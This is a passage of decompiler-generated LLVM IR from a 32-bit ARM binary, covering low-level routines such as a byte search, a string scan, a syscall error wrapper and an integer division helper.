  %v3_158cc = inttoptr i32 %v2_158cc to i32*
  %v4_158cc = load i32, i32* %v3_158cc, align 4
  %v2_158d0 = icmp eq i32 %v4_158cc, 0
  br i1 %v2_158d0, label %dec_label_pc_158d8, label %dec_label_pc_15954

dec_label_pc_158d8:                               ; preds = %dec_label_pc_158cc
  %v2_158d8 = add i32 %tmp, 3
  %v3_158d8 = inttoptr i32 %v2_158d8 to i8*
  %v4_158d8 = load i8, i8* %v3_158d8, align 1
  %v5_158d8 = zext i8 %v4_158d8 to i32
  %v2_158dc = add i32 %tmp, 44
  %v3_158dc = inttoptr i32 %v2_158dc to i32*
  %v4_158dc = load i32, i32* %v3_158dc, align 4
  store i32 %v4_158dc, i32* %r2.global-to-local, align 4
  %v2_158e0 = sub nsw i32 %v1_158b4, %v5_158d8
  %v1_158e8 = add nsw i32 %v2_158e0, -1
  %tmp11 = icmp slt i32 %v4_158dc, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_158d8
  %v7_158ec = add i32 %tmp, 2
  %v8_158ec = inttoptr i32 %v7_158ec to i8*
  %v9_158ec = load i8, i8* %v8_158ec, align 1
  %v10_158ec = zext i8 %v9_158ec to i32
  %v7_158f0 = sub nsw i32 %v1_158e8, %v10_158ec
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_158d8, %bb, %dec_label_pc_158bc, %dec_label_pc_158b4, %bb12
  %v0_1590c = phi i32 [ %v1_158b4, %dec_label_pc_158bc ], [ %v1_158b4, %dec_label_pc_158b4 ], [ 0, %bb ], [ %v7_158f0, %bb12 ], [ %v1_158e8, %dec_label_pc_158d8 ]
  %v1_158f4 = and i32 %v4_1589c, 64
  %v2_158f4 = icmp eq i32 %v1_158f4, 0
  %storemerge.in.in.v = select i1 %v2_158f4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_15900 = add i32 %tmp, 16
  %v3_15900 = inttoptr i32 %v2_15900 to i32*
  %v4_15900 = load i32, i32* %v3_15900, align 4
  %v2_15904 = sub i32 %storemerge, %v4_15900
  %v1_15908 = inttoptr i32 %arg2 to i32*
  %v2_15908 = load i32, i32* %v1_15908, align 4
  store i32 %v2_15908, i32* %r1.global-to-local, align 4
  %v3_15908 = add i32 %arg2, 4
  %v4_15908 = inttoptr i32 %v3_15908 to i32*
  %v5_15908 = load i32, i32* %v4_15908, align 4
  store i32 %v5_15908, i32* %r2.global-to-local, align 4
  %v2_1590c = add i32 %v2_15904, %v0_1590c
  store i32 %v2_1590c, i32* %r5.global-to-local, align 4
  %v2_15910 = sub i32 %v2_15908, %v2_1590c
  %v2_15914 = and i32 %v2_1590c, 1073741824
  %v3_15914 = icmp ne i32 %v2_15914, 0
  %v6_15914 = icmp eq i1 %v3_15914, false
  %tmp16 = icmp slt i32 %v2_1590c, 0
  %v4_15914.neg = zext i1 %tmp16 to i32
  %v7_15914 = add i32 %v5_15908, %v4_15914.neg
  %v9_15914 = sext i1 %v6_15914 to i32
  %v10_15914 = add i32 %v7_15914, %v9_15914
  store i32 %v10_15914, i32* %r4.global-to-local, align 4
  store i32 %v2_15910, i32* %v1_15908, align 4
  %v5_15918 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15918, i32* %v4_15908, align 4
  %v0_1591c = load i32, i32* %r6.global-to-local, align 4
  %v1_1591c = add i32 %v0_1591c, 4
  %v2_1591c = inttoptr i32 %v1_1591c to i32*
  %v3_1591c = load i32, i32* %v2_1591c, align 4
  %v1_15920 = load i32, i32* %r2.global-to-local, align 4
  %v8_15924 = icmp sgt i32 %v3_1591c, %v1_15920
  br i1 %v8_15924, label %dec_label_pc_15938, label %dec_label_pc_15928

dec_label_pc_15928:                               ; preds = %.thread
  %v9_15920 = icmp eq i32 %v3_1591c, %v1_15920
  br i1 %v9_15920, label %dec_label_pc_1592c, label %dec_label_pc_1593cthread-pre-split

dec_label_pc_1592c:                               ; preds = %dec_label_pc_15928
  %v1_1592c = inttoptr i32 %v0_1591c to i32*
  %v2_1592c = load i32, i32* %v1_1592c, align 4
  %v1_15930 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_1592c, %v1_15930
  br i1 %tmp17, label %dec_label_pc_15938, label %dec_label_pc_1593cthread-pre-split

dec_label_pc_15938:                               ; preds = %dec_label_pc_1592c, %.thread
  %v0_15938 = load i32, i32* %r5.global-to-local, align 4
  %v1_15938 = sub i32 0, %v0_15938
  store i32 %v1_15938, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1593c

dec_label_pc_1593cthread-pre-split:               ; preds = %dec_label_pc_1592c, %dec_label_pc_15928
  %v0_1593c.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1593c

dec_label_pc_1593c:                               ; preds = %dec_label_pc_1593cthread-pre-split, %dec_label_pc_15938
  %v0_1593c = phi i32 [ %v0_1593c.pr, %dec_label_pc_1593cthread-pre-split ], [ %v1_15938, %dec_label_pc_15938 ]
  %v1_1593c = icmp slt i32 %v0_1593c, 0
  br i1 %v1_1593c, label %dec_label_pc_15944, label %dec_label_pc_15958

dec_label_pc_15944:                               ; preds = %dec_label_pc_1593c
  %v0_15944 = call i32 @function_10a18()
  %v2_1594c = inttoptr i32 %v0_15944 to i32*
  store i32 75, i32* %v2_1594c, align 4
  %v0_15958.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15958

dec_label_pc_15954:                               ; preds = %dec_label_pc_158cc, %dec_label_pc_158c4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %dec_label_pc_1593c, %dec_label_pc_15944, %dec_label_pc_15954
  %v0_15958 = phi i32 [ %v0_1593c, %dec_label_pc_1593c ], [ %v0_15958.pre, %dec_label_pc_15944 ], [ -1, %dec_label_pc_15954 ]
  %v2_1595c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1595c, i32* @r4, align 4
  ret i32 %v0_15958

; uselistorder directives
  uselistorder i32 %v1_15920, { 1, 0 }
  uselistorder i32 %v3_1591c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_1589c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 64, { 3, 4, 5, 0, 1, 6, 2, 7 }
  uselistorder i32 44, { 7, 8, 10, 1, 9, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 40, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i8 1, { 0, 2, 3, 4, 5, 6, 25, 26, 22, 23, 24, 20, 21, 18, 19, 17, 15, 16, 14, 12, 11, 13, 9, 10, 8, 1, 7, 27, 28, 29 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15958, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @function_15960(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15960:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_15964 = load i32, i32* @r4, align 4
  %v6_15964 = load i32, i32* @lr, align 4
  %v1_15968 = add i32 %arg1, 4
  %v2_15968 = inttoptr i32 %v1_15968 to i32*
  %v3_15968 = load i32, i32* %v2_15968, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_15970 = load i32, i32* %arg2, align 4
  %v3_15970 = add i32 %tmp, 4
  %v4_15970 = inttoptr i32 %v3_15970 to i32*
  %v5_15970 = load i32, i32* %v4_15970, align 4
  %v6_15974 = call i32 @function_15a98(i32 %v3_15968, i32 %v2_15970, i32 %v5_15970, i32 %arg3, i32 %v3_15964, i32 %v6_15964)
  %v1_15978 = icmp slt i32 %v2_15970, 0
  %v6_15974. = select i1 %v1_15978, i32 %v6_15974, i32 0
  store i32 %v6_15974., i32* %r3.global-to-local, align 4
  br i1 %v1_15978, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_15960
  %v3_15984 = load i32, i32* @r4, align 4
  %v4_15984 = inttoptr i32 %v3_15984 to i32*
  store i32 %v6_15974, i32* %v4_15984, align 4
  %v6_15984 = add i32 %v3_15984, 4
  %v7_15984 = inttoptr i32 %v6_15984 to i32*
  store i32 %v2_15970, i32* %v7_15984, align 4
  %v0_15988.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15960, %bb
  %v0_15988 = phi i32 [ %v6_15974, %dec_label_pc_15960 ], [ %v0_15988.pre, %bb ]
  ret i32 %v0_15988

; uselistorder directives
  uselistorder i32 %v6_15974, { 0, 2, 1 }
  uselistorder i32 %v2_15970, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15990(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_159b4:
  %v1_15994 = urem i32 %arg1, 256
  store i32 %v1_15994, i32* @lr, align 4
  %v4_159b4 = mul nuw nsw i32 %v1_15994, 256
  %v5_159b4 = or i32 %v4_159b4, %v1_15994
  %v4_159bc = mul i32 %v5_159b4, 65536
  %v5_159bc = or i32 %v4_159bc, %v5_159b4
  %v0_159c0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_159c0

dec_label_pc_159c0:                               ; preds = %dec_label_pc_15a2c, %dec_label_pc_159c0, %dec_label_pc_159b4
  %v0_159c0 = phi i32 [ %v0_159c0.pre, %dec_label_pc_159b4 ], [ %v4_159c0, %dec_label_pc_159c0 ], [ %v4_159c0, %dec_label_pc_15a2c ]
  %v1_159c0 = inttoptr i32 %v0_159c0 to i32*
  %v2_159c0 = load i32, i32* %v1_159c0, align 4
  %v4_159c0 = add i32 %v0_159c0, 4
  store i32 %v4_159c0, i32* @ip, align 4
  %v2_159c8 = xor i32 %v2_159c0, %v5_159bc
  %v2_159cc = add i32 %v2_159c8, 2130640639
  %v1_159d4 = sub i32 -1, %v2_159c8
  %v2_159d8 = xor i32 %v2_159cc, %v1_159d4
  %v2_159dc = and i32 %v2_159d8, -2130640640
  %v2_159e0 = icmp eq i32 %v2_159dc, 0
  br i1 %v2_159e0, label %dec_label_pc_159c0, label %dec_label_pc_159e8

dec_label_pc_159e8:                               ; preds = %dec_label_pc_159c0
  %v2_159e8 = inttoptr i32 %v0_159c0 to i8*
  %v3_159e8 = load i8, i8* %v2_159e8, align 1
  %v4_159e8 = zext i8 %v3_159e8 to i32
  %v9_159f0 = icmp eq i32 %v4_159e8, %v1_15994
  store i1 %v9_159f0, i1* @cpsr_z, align 1
  %v1_159f4 = add i32 %v0_159c0, 3
  %v1_159f8 = add i32 %v0_159c0, 1
  store i32 %v1_159f8, i32* @r2, align 4
  %v1_159fc = add i32 %v0_159c0, 2
  br i1 %v9_159f0, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_159e8
  ret i32 %v0_159c0

bb18:                                             ; preds = %dec_label_pc_159e8
  %v2_15a04 = inttoptr i32 %v1_159f8 to i8*
  %v3_15a04 = load i8, i8* %v2_15a04, align 1
  %v4_15a04 = zext i8 %v3_15a04 to i32
  %v9_15a08 = icmp eq i32 %v4_15a04, %v1_15994
  store i1 %v9_15a08, i1* @cpsr_z, align 1
  br i1 %v9_15a08, label %dec_label_pc_15a10, label %dec_label_pc_15a18

dec_label_pc_15a10:                               ; preds = %bb18
  ret i32 %v1_159f8

dec_label_pc_15a18:                               ; preds = %bb18
  %v2_15a18 = inttoptr i32 %v1_159fc to i8*
  %v3_15a18 = load i8, i8* %v2_15a18, align 1
  %v4_15a18 = zext i8 %v3_15a18 to i32
  %v9_15a1c = icmp eq i32 %v4_15a18, %v1_15994
  store i1 %v9_15a1c, i1* @cpsr_z, align 1
  br i1 %v9_15a1c, label %dec_label_pc_15a24, label %dec_label_pc_15a2c

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a18
  ret i32 %v1_159fc

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_15a18
  %v2_15a2c = inttoptr i32 %v1_159f4 to i8*
  %v3_15a2c = load i8, i8* %v2_15a2c, align 1
  %v4_15a2c = zext i8 %v3_15a2c to i32
  %v9_15a30 = icmp eq i32 %v4_15a2c, %v1_15994
  store i1 %v9_15a30, i1* @cpsr_z, align 1
  br i1 %v9_15a30, label %dec_label_pc_15a38, label %dec_label_pc_159c0

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a2c
  ret i32 %v1_159f4

; uselistorder directives
  uselistorder i32 %v4_159c0, { 2, 1, 0 }
  uselistorder i32 %v0_159c0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_159b4, { 1, 0 }
  uselistorder i32 %v1_15994, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @function_15a48(i8* %arg1) local_unnamed_addr {
dec_label_pc_15a48:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_15a802 = load i32, i32* @r0, align 4
  %v1_15a803 = inttoptr i32 %v0_15a802 to i8*
  %v2_15a804 = load i8, i8* %v1_15a803, align 1
  %v3_15a805 = zext i8 %v2_15a804 to i32
  store i32 %v3_15a805, i32* @r2, align 4
  %v2_15a846 = icmp eq i8 %v2_15a804, 0
  br i1 %v2_15a846, label %dec_label_pc_15a90, label %dec_label_pc_15a5c.preheader

dec_label_pc_15a54:                               ; preds = %dec_label_pc_15a5c
  %v1_15a64 = add i32 %v0_15a64, 1
  %v9_15a54 = icmp eq i32 %v0_15a70, %v3_15a5c
  br i1 %v9_15a54, label %dec_label_pc_15a70, label %dec_label_pc_15a5c

dec_label_pc_15a5c:                               ; preds = %dec_label_pc_15a5c.preheader, %dec_label_pc_15a54
  %v0_15a64 = phi i32 [ %tmp, %dec_label_pc_15a5c.preheader ], [ %v1_15a64, %dec_label_pc_15a54 ]
  %v1_15a5c = inttoptr i32 %v0_15a64 to i8*
  %v2_15a5c = load i8, i8* %v1_15a5c, align 1
  %v3_15a5c = zext i8 %v2_15a5c to i32
  store i32 %v3_15a5c, i32* @ip, align 4
  %v2_15a60 = icmp eq i8 %v2_15a5c, 0
  br i1 %v2_15a60, label %dec_label_pc_15a90, label %dec_label_pc_15a54

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a54
  %v2_15a70 = icmp eq i32 %v0_15a70, 0
  br i1 %v2_15a70, label %dec_label_pc_15a90, label %dec_label_pc_15a78

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a70
  %v1_15a78 = add i32 %v0_15a78, 1
  store i32 %v1_15a78, i32* @lr, align 4
  %v1_15a7c = add i32 %v0_15a7c, 1
  %v1_15a80 = inttoptr i32 %v1_15a7c to i8*
  %v2_15a80 = load i8, i8* %v1_15a80, align 1
  %v3_15a80 = zext i8 %v2_15a80 to i32
  store i32 %v3_15a80, i32* @r2, align 4
  %v2_15a84 = icmp eq i8 %v2_15a80, 0
  br i1 %v2_15a84, label %dec_label_pc_15a90, label %dec_label_pc_15a5c.preheader

dec_label_pc_15a5c.preheader:                     ; preds = %dec_label_pc_15a48, %dec_label_pc_15a78
  %v0_15a7c = phi i32 [ %v1_15a7c, %dec_label_pc_15a78 ], [ %v0_15a802, %dec_label_pc_15a48 ]
  %v0_15a78 = phi i32 [ %v1_15a78, %dec_label_pc_15a78 ], [ 0, %dec_label_pc_15a48 ]
  %v0_15a70 = phi i32 [ %v3_15a80, %dec_label_pc_15a78 ], [ %v3_15a805, %dec_label_pc_15a48 ]
  br label %dec_label_pc_15a5c

dec_label_pc_15a90:                               ; preds = %dec_label_pc_15a70, %dec_label_pc_15a78, %dec_label_pc_15a5c, %dec_label_pc_15a48
  %v0_15a90 = phi i32 [ 0, %dec_label_pc_15a48 ], [ %v0_15a78, %dec_label_pc_15a5c ], [ %v1_15a78, %dec_label_pc_15a78 ], [ %v0_15a78, %dec_label_pc_15a70 ]
  ret i32 %v0_15a90

; uselistorder directives
  uselistorder i32 %v3_15a5c, { 1, 0 }
  uselistorder i32 %v0_15a64, { 1, 0 }
  uselistorder i8 0, { 37, 36, 25, 3, 11, 0, 39, 38, 26, 40, 41, 42, 43, 23, 44, 46, 47, 45, 4, 5, 6, 48, 1, 49, 8, 34, 12, 13, 2, 50, 51, 52, 54, 55, 56, 57, 53, 24, 58, 59, 60, 61, 62, 9, 14, 15, 16, 17, 18, 19, 7, 64, 63, 20, 65, 66, 21, 67, 27, 10, 68, 69, 70, 72, 28, 73, 74, 71, 75, 76, 77, 78, 80, 79, 81, 84, 82, 83, 85, 88, 86, 87, 89, 35, 90, 91, 92, 93, 118, 119, 115, 116, 117, 110, 111, 112, 113, 114, 108, 109, 104, 105, 106, 107, 102, 103, 100, 101, 98, 96, 97, 99, 94, 95, 120, 121, 122, 123, 124, 125, 126, 128, 127, 130, 129, 131, 29, 133, 132, 22, 134, 30, 135, 137, 138, 136, 31, 139, 140, 33, 141, 32, 142, 143 }
  uselistorder label %dec_label_pc_15a90, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15a5c.preheader, { 1, 0 }
}

define i32 @function_15a98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_15a98:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15adc, label %dec_label_pc_15ac8

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15a98
  %v0_15ac8 = call i32 @function_10a18()
  %v0_15acc = load i32, i32* %r4.global-to-local, align 4
  %v1_15acc = sub i32 0, %v0_15acc
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15ad4 = inttoptr i32 %v0_15ac8 to i32*
  store i32 %v1_15acc, i32* %v2_15ad4, align 4
  %v0_15ae4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ae4

dec_label_pc_15adc:                               ; preds = %dec_label_pc_15a98
  %v2_15adc = icmp eq i32 %arg1, 0
  br i1 %v2_15adc, label %dec_label_pc_15af0, label %dec_label_pc_15ae4

dec_label_pc_15ae4:                               ; preds = %dec_label_pc_15adc, %dec_label_pc_15ac8
  %v0_15ae4 = phi i32 [ %arg1, %dec_label_pc_15adc ], [ %v0_15ae4.pre, %dec_label_pc_15ac8 ]
  br label %dec_label_pc_15af4

dec_label_pc_15af0:                               ; preds = %dec_label_pc_15adc
  br label %dec_label_pc_15af4

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15ae4, %dec_label_pc_15af0
  %v14_15af8 = phi i32 [ %v0_15ae4, %dec_label_pc_15ae4 ], [ %tmp9, %dec_label_pc_15af0 ]
  ret i32 %v14_15af8

; uselistorder directives
  uselistorder i32 ()* @function_10a18, { 59, 58, 57, 18, 38, 56, 27, 55, 12, 11, 10, 9, 24, 62, 8, 23, 63, 54, 53, 52, 44, 43, 61, 60, 17, 51, 26, 36, 40, 39, 16, 30, 33, 45, 32, 50, 49, 48, 1, 15, 37, 7, 6, 47, 29, 0, 22, 5, 14, 2, 21, 13, 34, 20, 19, 46, 4, 3, 28, 42, 41, 35, 31, 25 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_15af4, { 1, 0 }
}

define i32 @function_15afc() local_unnamed_addr {
dec_label_pc_15afc:
  %v0_15afc = load i32, i32* @r1, align 4
  %v1_15afc = icmp slt i32 %v0_15afc, 0
  %v2_15afc = icmp eq i32 %v0_15afc, 0
  %v0_15b00 = load i32, i32* @r0, align 4
  %v2_15b00 = xor i32 %v0_15b00, %v0_15afc
  br i1 %v2_15afc, label %dec_label_pc_15c14, label %dec_label_pc_15b08

dec_label_pc_15b08:                               ; preds = %dec_label_pc_15afc
  br i1 %v1_15afc, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_15b08
  %v2_15b08 = sub i32 0, %v0_15afc
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_15b08, %bb
  %v1_15bd4 = phi i32 [ %v2_15b08, %bb ], [ %v0_15afc, %dec_label_pc_15b08 ]
  %v1_15b0c = add i32 %v1_15bd4, -1
  %v7_15b0c = icmp eq i32 %v1_15bd4, 1
  br i1 %v7_15b0c, label %dec_label_pc_15bb4, label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %thread-pre-split
  %v1_15b14 = icmp slt i32 %v0_15b00, 0
  br i1 %v1_15b14, label %bb86, label %bb87

bb86:                                             ; preds = %dec_label_pc_15b14
  %v2_15b18 = sub i32 0, %v0_15b00
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_15b14, %bb86
  %v0_15c08 = phi i32 [ %v0_15b00, %dec_label_pc_15b14 ], [ %v2_15b18, %bb86 ]
  %v3_15b1c = icmp uge i32 %v0_15c08, %v1_15bd4
  %v9_15b1c = icmp eq i32 %v0_15c08, %v1_15bd4
  %v2_15b20 = xor i1 %v3_15b1c, true
  %v3_15b20 = or i1 %v9_15b1c, %v2_15b20
  br i1 %v3_15b20, label %dec_label_pc_15bc0, label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %bb87
  %v2_15b24 = and i32 %v1_15b0c, %v1_15bd4
  %v4_15b24 = icmp eq i32 %v2_15b24, 0
  br i1 %v4_15b24, label %dec_label_pc_15bd0, label %dec_label_pc_15b2c

dec_label_pc_15b2c:                               ; preds = %dec_label_pc_15b24
  %v3_15b2c = icmp ult i32 %v1_15bd4, 536870912
  br i1 %v3_15b2c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_15b2c
  %v4_15b30 = mul i32 %v1_15bd4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_15b2c, %.thread
  %v0_15b50.pr40.ph = phi i32 [ %v4_15b30, %.thread ], [ %v1_15bd4, %dec_label_pc_15b2c ]
  %storemerge144 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_15b2c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb90
  %v0_15b50.pr40 = phi i32 [ %v4_15b44, %bb90 ], [ %v0_15b50.pr40.ph, %.preheader.preheader ]
  %v1_15b48 = phi i32 [ %v4_15b48, %bb90 ], [ %storemerge144, %.preheader.preheader ]
  %v2_15b3c = icmp ugt i32 %v0_15b50.pr40, 268435455
  br i1 %v2_15b3c, label %.thread3, label %bb88

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_15b50thread-pre-split.loopexit

bb88:                                             ; preds = %.preheader
  %v4_15b40 = icmp ult i32 %v0_15b50.pr40, %v0_15c08
  br i1 %v4_15b40, label %bb89, label %dec_label_pc_15b50thread-pre-split.loopexit.loopexit

bb89:                                             ; preds = %bb88
  %v2_15b44 = and i32 %v0_15b50.pr40, 268435456
  %v3_15b44 = icmp eq i32 %v2_15b44, 0
  %v4_15b44 = mul i32 %v0_15b50.pr40, 16
  br i1 %v3_15b44, label %bb90, label %dec_label_pc_15b50.loopexit

bb90:                                             ; preds = %bb89
  %v2_15b48 = and i32 %v1_15b48, 268435456
  %v3_15b48 = icmp eq i32 %v2_15b48, 0
  %v4_15b48 = mul i32 %v1_15b48, 16
  br i1 %v3_15b48, label %.preheader, label %dec_label_pc_15b50thread-pre-split.loopexit.loopexit

dec_label_pc_15b50thread-pre-split.loopexit.loopexit: ; preds = %bb90, %bb88
  %v1_15b5c52.ph = phi i32 [ %v1_15b48, %bb88 ], [ %v4_15b48, %bb90 ]
  %v0_15b50.pr42.ph = phi i32 [ %v0_15b50.pr40, %bb88 ], [ %v4_15b44, %bb90 ]
  br label %dec_label_pc_15b50thread-pre-split.loopexit

dec_label_pc_15b50thread-pre-split.loopexit:      ; preds = %dec_label_pc_15b50thread-pre-split.loopexit.loopexit, %.thread3
  %v1_15b5c52 = phi i32 [ %v1_15b48, %.thread3 ], [ %v1_15b5c52.ph, %dec_label_pc_15b50thread-pre-split.loopexit.loopexit ]
  %v0_15b50.pr42 = phi i32 [ %v0_15b50.pr40, %.thread3 ], [ %v0_15b50.pr42.ph, %dec_label_pc_15b50thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_15b50thread-pre-split

dec_label_pc_15b50thread-pre-split:               ; preds = %dec_label_pc_15b50thread-pre-split.loopexit, %bb92
  %v1_15b5c50 = phi i32 [ %v1_15b5c52, %dec_label_pc_15b50thread-pre-split.loopexit ], [ %v3_15b5c, %bb92 ]
  %v2_15b5448 = phi i32 [ %v0_15c08, %dec_label_pc_15b50thread-pre-split.loopexit ], [ %v2_15b54, %bb92 ]
  %v0_15b50.pr = phi i32 [ %v0_15b50.pr42, %dec_label_pc_15b50thread-pre-split.loopexit ], [ %v3_15b58, %bb92 ]
  br label %dec_label_pc_15b50

dec_label_pc_15b50.loopexit:                      ; preds = %bb89
  br label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %dec_label_pc_15b50.loopexit, %dec_label_pc_15b50thread-pre-split
  %v1_15b5c = phi i32 [ %v1_15b5c50, %dec_label_pc_15b50thread-pre-split ], [ %v1_15b48, %dec_label_pc_15b50.loopexit ]
  %v2_15b54 = phi i32 [ %v2_15b5448, %dec_label_pc_15b50thread-pre-split ], [ %v0_15c08, %dec_label_pc_15b50.loopexit ]
  %v1_15b58 = phi i32 [ %v0_15b50.pr, %dec_label_pc_15b50thread-pre-split ], [ %v4_15b44, %dec_label_pc_15b50.loopexit ]
  %v2_15b50 = icmp slt i32 %v1_15b58, 0
  br i1 %v2_15b50, label %dec_label_pc_15b64, label %bb91

bb91:                                             ; preds = %dec_label_pc_15b50
  %v4_15b54 = icmp ult i32 %v1_15b58, %v2_15b54
  br i1 %v4_15b54, label %bb92, label %dec_label_pc_15b64

bb92:                                             ; preds = %bb91
  %v3_15b58 = mul i32 %v1_15b58, 2
  %v2_15b5c = icmp slt i32 %v1_15b5c, 0
  %v3_15b5c = mul i32 %v1_15b5c, 2
  br i1 %v2_15b5c, label %dec_label_pc_15b64, label %dec_label_pc_15b50thread-pre-split

dec_label_pc_15b64:                               ; preds = %bb91, %dec_label_pc_15b50, %bb92
  %v2_15b7063 = phi i32 [ %v3_15b5c, %bb92 ], [ %v1_15b5c, %bb91 ], [ %v1_15b5c, %dec_label_pc_15b50 ]
  %v1_15b6855 = phi i32 [ %v3_15b58, %bb92 ], [ %v1_15b58, %bb91 ], [ %v1_15b58, %dec_label_pc_15b50 ]
  br label %dec_label_pc_15b68

dec_label_pc_15b68:                               ; preds = %.thread13, %dec_label_pc_15b64
  %v1_15b9c = phi i32 [ %v4_15b9c, %.thread13 ], [ %v2_15b7063, %dec_label_pc_15b64 ]
  %v1_15b70 = phi i32 [ %v1_15bac, %.thread13 ], [ 0, %dec_label_pc_15b64 ]
  %v1_15ba0 = phi i32 [ %v4_15ba0, %.thread13 ], [ %v1_15b6855, %dec_label_pc_15b64 ]
  %v1_15b6c = phi i32 [ %v0_15b98, %.thread13 ], [ %v0_15c08, %dec_label_pc_15b64 ]
  %v3_15b68 = icmp ult i32 %v1_15b6c, %v1_15ba0
  br i1 %v3_15b68, label %.thread8, label %bb93

bb93:                                             ; preds = %dec_label_pc_15b68
  %v3_15b6c = sub i32 %v1_15b6c, %v1_15ba0
  %v3_15b70 = or i32 %v1_15b70, %v1_15b9c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15b68, %bb93
  %v1_15b78 = phi i32 [ %v1_15b6c, %dec_label_pc_15b68 ], [ %v3_15b6c, %bb93 ]
  %v1_15b7c = phi i32 [ %v1_15b70, %dec_label_pc_15b68 ], [ %v3_15b70, %bb93 ]
  %v4_15b74 = udiv i32 %v1_15ba0, 2
  %v6_15b74 = icmp ult i32 %v1_15b78, %v4_15b74
  br i1 %v6_15b74, label %.thread9, label %bb94

bb94:                                             ; preds = %.thread8
  %v3_15b78 = urem i32 %v1_15ba0, 2
  %v4_15b78 = icmp eq i32 %v3_15b78, 0
  %v6_15b78 = sub i32 %v1_15b78, %v4_15b74
  br i1 %v4_15b78, label %.thread9, label %bb95

bb95:                                             ; preds = %bb94
  %v5_15b7c = udiv i32 %v1_15b9c, 2
  %v6_15b7c = or i32 %v1_15b7c, %v5_15b7c
  br label %.thread9

.thread9:                                         ; preds = %bb94, %.thread8, %bb95
  %v1_15b84 = phi i32 [ %v6_15b78, %bb94 ], [ %v1_15b78, %.thread8 ], [ %v6_15b78, %bb95 ]
  %v1_15b88 = phi i32 [ %v1_15b7c, %bb94 ], [ %v1_15b7c, %.thread8 ], [ %v6_15b7c, %bb95 ]
  %v4_15b80 = udiv i32 %v1_15ba0, 4
  %v6_15b80 = icmp ult i32 %v1_15b84, %v4_15b80
  br i1 %v6_15b80, label %.thread10, label %bb96

bb96:                                             ; preds = %.thread9
  %v3_15b84 = and i32 %v1_15ba0, 2
  %v4_15b84 = icmp eq i32 %v3_15b84, 0
  %v6_15b84 = sub i32 %v1_15b84, %v4_15b80
